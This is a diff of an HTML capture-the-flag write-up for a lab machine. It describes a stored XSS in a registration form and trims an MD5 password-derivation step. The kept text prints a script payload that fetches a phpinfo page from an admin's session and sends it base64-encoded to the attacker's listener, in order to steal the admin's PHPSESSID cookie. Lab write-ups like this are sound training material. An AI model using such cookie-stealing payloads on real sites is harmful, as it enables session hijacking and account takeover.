@@ -81,23 +81,18 @@
                 <p>The last endpoint was accesible</p>
                 <span class="path">http://robots.thm/harm/to/self/</span>
                 <p>This page contained a registration form.</p>
-                
-                <img src="images/registerLondra.png" class="lab-image zoomable">
-                <p>So the password will be the username + day and month.<br> I generated the MD5 hash (The password) using:</p>
-                <img src="images/md5hashpassword.png" class="lab-image zoomable">
-                <code><pre>└─$ python3 -c "import hashlib; print(hashlib.md5('londraddmm'.encode()).hexdigest())"</pre></code>
 
-                <p>I then tried to use javascript as username</p>
+                <p>I tried to use javascript as username</p>
                 <img src="images/xss.png" class="lab-image zoomable">
 
                 <p>It worked, confirming a stored XSS vulnerability.</p>
                 <img src="images/xssSuccess.png" class="lab-image zoomable">
 
-                <p>An admin is actively monitoring new user registrations. The PHPSESSID session cookie currently set is marked HttpOnly, so JavaScript can’t touch it. Fortunately, the phpinfo() page is exposed at:
+                <p>An admin is actively monitoring new user registrations. The PHPSESSID session cookie currently set is marked HttpOnly, so JavaScript can’t touch it. Fortunately, the phpinfo() page which is only accesible when logged in, is exposed at:
                 </p>
                 <span class="path">http://robots.thm/harm/to/self/server_info.php</span>
                 <p>The PHPSESSID is exposed in this file. If we fetch it, encode it to base64, and send it to our server, we may be able to hijack the admin’s session.</p>
-                <p>I wrote a simple JavaScript payload and used it as the username:</p>
+                <p>I wrote a JavaScript payload and used it as the username:</p>
                 <pre><code>&lt;script&gt;fetch('/harm/to/self/server_info.php').then(response =&gt; response.text()).then(data =&gt; {fetch("http://192.168.169.133:8000/" + btoa(data));});&lt;/script&gt;</code></pre>
 
                 <p>Started a netcat listener on port 8000 and send the output to a file</p>
